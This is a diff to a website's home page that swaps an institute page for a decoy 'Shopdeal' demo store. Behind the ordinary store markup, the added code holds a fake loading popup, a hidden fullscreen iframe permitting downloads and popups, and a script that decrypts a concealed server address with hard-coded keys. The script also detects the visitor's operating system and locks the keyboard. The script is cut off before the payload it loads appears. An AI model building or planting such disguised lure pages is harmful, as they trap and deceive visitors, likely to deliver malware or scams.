@@ -1,655 +1,719 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MetricBrainCliff | Cognitive Neuroscience & Quantitative Learning Institute</title>
-  <meta name="description" content="MetricBrainCliff pioneers quantitative psychometrics, memory cliff retention dynamics, synaptic plasticity analytics, and evidence-based higher education.">
-  <link rel="canonical" href="https://metricbraincliff.com/">
-  <!-- Google Analytics Tag -->
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-MD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
-  <!-- Google Fonts via link stylesheet -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,500;0,600;0,700;1,500&family=JetBrains+Mono:wght@400;500;600&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="assets/css/style.css">
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-<header class="site-header">
-  <div class="container">
-    <div class="header-inner">
-      <a href="index.php" class="brand-logo">
-        <span class="brand-name">MetricBrainCliff</span>
-        <span class="brand-tag">Cognitive Neuroscience &amp; Quantitative Learning</span>
-      </a>
-
-      <ul class="nav-links">
-        <li><a href="index.php" class="active">Curricula</a></li>
-        <li><a href="about.html">Institute</a></li>
-        <li><a href="blog.html">Treatises</a></li>
-        <li><a href="contact.html">Admissions</a></li>
-      </ul>
-
-      <div class="header-cta">
-        <a href="contact.html" class="btn btn-primary btn-sm">Apply for Cohort</a>
-        <button class="mobile-toggle" id="mobile-toggle" aria-label="Toggle Navigation Menu">&#9776;</button>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're preparing your store experience.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
   </div>
-</header>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
 
-<div class="mobile-drawer" id="mobile-drawer">
-  <button class="drawer-close" id="drawer-close" aria-label="Close Navigation Menu">&times;</button>
-  <ul class="drawer-links">
-    <li><a href="index.php">Curricula</a></li>
-    <li><a href="about.html">Institute</a></li>
-    <li><a href="blog.html">Treatises</a></li>
-    <li><a href="contact.html">Admissions</a></li>
-    <li><a href="privacy-policy.html">Privacy Policy</a></li>
-    <li><a href="terms-and-conditions.html">Terms</a></li>
-  </ul>
-  <div class="drawer-contact">
-    <p><strong>MetricBrainCliff Institute</strong></p>
-    <p>&#128205; 181 Mercer Street, New York, NY 10012, United States</p>
-    <p>&#128222; +1-888-777-5845</p>
-  </div>
-</div>
-<div class="drawer-overlay" id="drawer-overlay"></div>
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-<!-- Section 1: Hero -->
-<section class="hero">
-  <div class="container">
-    <div class="hero-grid">
-      <div>
-        <span class="hero-badge">&#9670; Quantitative Learning Institute &bull; Academic Year 2026</span>
-        <h1 class="hero-title">Empirical Cognitive Science Beyond the Retention Cliff</h1>
-        <p class="hero-lead">
-          MetricBrainCliff applies statistical physics, psychometric psychophysics, and synaptic plasticity analytics to master human learning efficiency. Eradicate rote attrition through mathematical spaced retrieval protocols.
-        </p>
-        <div class="hero-actions">
-          <a href="#fellowships" class="btn btn-primary">Explore Academic Tracks</a>
-          <a href="#calculator" class="btn btn-azure">Retention Cliff Calculator</a>
-        </div>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
         <div class="hero-stats">
-          <div class="stat-item">
-            <h4>3.8x</h4>
-            <p>Spaced Retrieval Multiplier</p>
-          </div>
-          <div class="stat-item">
-            <h4>4.2 ms</h4>
-            <p>P300 Latency Precision</p>
-          </div>
-          <div class="stat-item">
-            <h4>94%</h4>
-            <p>Longitudinal Concept Retention</p>
-          </div>
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
         </div>
       </div>
-      <div class="hero-img-wrap">
-        <img src="assets/images/hero_metric_brain_cliff_institute.jpg" alt="Neoclassical academic library hall at MetricBrainCliff" width="600" height="750">
-        <div class="hero-caption">
-          <strong>The Research Library Hall</strong> &mdash; Scholars conducting longitudinal cognitive mapping and psychometric modeling.
-        </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
       </div>
     </div>
+
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
+        </div>
+
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
+            </div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
   </div>
-</section>
 
-<!-- Section 2: Core Research Curricula Showcase -->
-<section class="section" id="curricula">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Academic Curricula &bull; Advanced Cohorts</span>
-      <h2>Specialized Cognitive Learning Disciplines</h2>
-      <p>Four rigorous institutional tracks combining laboratory neuroscience with advanced mathematical pedagogy.</p>
-    </div>
-    <div class="grid-4">
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/cognitive_neuroscience_study_analytics.jpg" alt="Synaptic Plasticity & Memory Architecture" loading="lazy">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Track I &bull; Neurobiology</span>
-          <h3 class="card-title">Synaptic Architecture</h3>
-          <p class="card-desc">Cellular analysis of long-term potentiation (LTP), dendritic spine remodeling, and protein kinase memory synthesis.</p>
-          <a href="contact.html" class="btn btn-outline btn-sm">Cohort Syllabus</a>
-        </div>
-      </div>
 
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/psychometric_intelligence_data_dashboard.jpg" alt="Quantitative Psychometrics" loading="lazy">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Track II &bull; Psychometrics</span>
-          <h3 class="card-title">Quantitative Analytics</h3>
-          <p class="card-desc">Item response theory (IRT), Bayesian knowledge tracing, and multidimensional adaptive testing algorithms.</p>
-          <a href="contact.html" class="btn btn-outline btn-sm">Cohort Syllabus</a>
-        </div>
-      </div>
-
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/cognitive_load_working_memory_graph.jpg" alt="Cognitive Load Optimization" loading="lazy">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Track III &bull; Working Memory</span>
-          <h3 class="card-title">Bandwidth Engineering</h3>
-          <p class="card-desc">Mathematical modeling of intrinsic, germane, and extraneous cognitive load to optimize high-complexity STEM curricula.</p>
-          <a href="contact.html" class="btn btn-outline btn-sm">Cohort Syllabus</a>
-        </div>
-      </div>
-
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/computational_neural_modeling_workstation.jpg" alt="Computational Learning Models" loading="lazy">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Track IV &bull; Computation</span>
-          <h3 class="card-title">Neural Networks</h3>
-          <p class="card-desc">Simulating associative memory consolidation, catastrophic forgetting, and artificial deep reinforcement transfer.</p>
-          <a href="contact.html" class="btn btn-outline btn-sm">Cohort Syllabus</a>
-        </div>
-      </div>
-    </div>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
   </div>
-</section>
 
-<!-- Section 3: Interactive Cognitive Retention Cliff & Spaced Retrieval Calculator -->
-<section class="section section-alt" id="calculator">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Psychometric Modeling Tool</span>
-      <h2>Interactive Cognitive Retention Cliff &amp; Spaced Retrieval Calculator</h2>
-      <p>Simulate how elapsed time, concept complexity, and active retrieval intervals govern synaptic forgetting curves.</p>
-    </div>
-    <div class="calc-box">
-      <div class="calc-grid">
-        <div class="calc-form">
-          <div class="calc-group">
-            <label for="discipline-select">Curriculum Epistemological Complexity</label>
-            <select id="discipline-select" class="calc-select">
-              <option value="0.75">Dense Theoretical Physics &amp; Mathematics (High Working Memory Load)</option>
-              <option value="1.0" selected>Neuroanatomy &amp; Empirical Laboratory Sciences (Balanced Schema)</option>
-              <option value="1.25">Applied Analytical Statistics &amp; Coding (High Interleaving Transfer)</option>
-              <option value="1.45">Linguistic Semantics &amp; Historical Epistemology (High Dual Coding)</option>
-            </select>
-          </div>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX18k+G0kjyj75mMlfCkTzeNC+gcXJAVHFELnXrHVMUxcQe75KNXpm1mT";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-          <div class="calc-group">
-            <label for="days-input">Elapsed Time Since Primary Encoding: <span id="days-val" style="color:var(--color-accent);font-family:var(--font-mono);">7 Days</span></label>
-            <input type="range" id="days-input" class="calc-range" min="1" max="45" value="7" step="1">
-            <small style="color:var(--color-slate-500);font-size:0.75rem;">1 Day (Fresh Encoding) &larr;&rarr; 45 Days (Unassisted Synaptic Decay)</small>
-          </div>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-          <div class="calc-group">
-            <label for="reviews-select">Active Spaced Retrieval Iterations Completed</label>
-            <select id="reviews-select" class="calc-select">
-              <option value="1.0">0 Prior Retrievals (Standard Rote Passive Reading)</option>
-              <option value="1.8" selected>1 Active Spaced Retrieval Session (+24 Hours)</option>
-              <option value="2.9">2 Iterative Retrieval Cycles (+24 Hours, +7 Days)</option>
-              <option value="4.4">3 Calibrated Cycles (+24 Hours, +7 Days, +21 Days)</option>
-            </select>
-          </div>
-        </div>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-        <div class="calc-result">
-          <span style="font-family:var(--font-mono);font-size:0.8rem;text-transform:uppercase;letter-spacing:0.1em;color:var(--color-slate-500);">Predicted Concept Retention Probability</span>
-          <div class="calc-metric" id="retention-score">76 %</div>
-          <h3 id="decay-category" style="color:var(--color-slate-900);margin-bottom:0.75rem;">Stable Synaptic Consolidation (Overlearning Band)</h3>
-          <p style="font-size:0.88rem;color:var(--color-slate-600);line-height:1.6;margin-bottom:1.5rem;">
-            Spaced testing forces dendritic reconsolidation, flattening the steep Ebbinghaus retention cliff and locking knowledge into long-term cortical networks.
-          </p>
